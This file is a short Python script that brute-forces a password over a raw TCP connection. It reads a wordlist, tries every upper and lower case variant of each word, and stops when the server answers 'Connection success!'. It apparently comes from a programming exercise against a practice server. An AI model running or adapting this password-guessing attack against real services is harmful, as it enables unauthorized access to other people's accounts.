import socket
import sys
import os
from itertools import product, chain

# Ensure there are two command-line arguments (script name, IP address, and port)
if len(sys.argv) != 3:
    print("Usage: script.py <ip> <port>")
    sys.exit(1)

ip_address, port = sys.argv[1], int(sys.argv[2])

# Function to load passwords from a file and generate all case combinations


def load_passwords(file_name):
    with open(file_name, 'r') as file:
        for line in file:
            password = line.strip()  # Remove newline characters
            # Generate all combinations of upper and lower case for the password
            for case_combination in map(''.join, product(*zip(password.upper(), password.lower()))):
                yield case_combination


# Establish a connection to the server
client_socket = socket.socket()
try:
    client_socket.connect((ip_address, port))
except Exception as e:
    print(f"Error connecting to the server: {e}")
    sys.exit(1)

# Function to try passwords until the correct one is found


def try_passwords(socket, passwords):
    for password in passwords:
        socket.send(password.encode())
        response = socket.recv(1024).decode()
        if response == "Connection success!":
            print(password)
            break


# Load passwords from 'passwords.txt' and try them
passwords_generator = load_passwords(
    os.path.join(os.getcwd(), 'passwords.txt'))
try_passwords(client_socket, passwords_generator)

client_socket.close()
